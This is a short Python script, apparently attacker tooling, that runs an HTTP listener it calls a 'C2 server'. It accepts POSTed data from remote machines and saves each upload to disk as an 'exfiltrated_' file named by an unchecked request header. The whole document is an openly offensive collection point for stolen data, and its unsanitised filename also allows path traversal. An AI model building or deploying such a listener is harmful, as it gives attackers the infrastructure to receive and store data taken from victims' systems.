from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        field_data = self.rfile.read(length)
        
        filename = self.headers.get('File-Name', 'unknown_file')
        with open(f'exfiltrated_{filename}', 'wb') as f:
            f.write(field_data)
        
        print(f"[+] Received: {filename}")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    httpd = HTTPServer(('0.0.0.0', 8000), SimpleHandler)
    print("C2 server listening at http://localhost:8000")
    httpd.serve_forever()
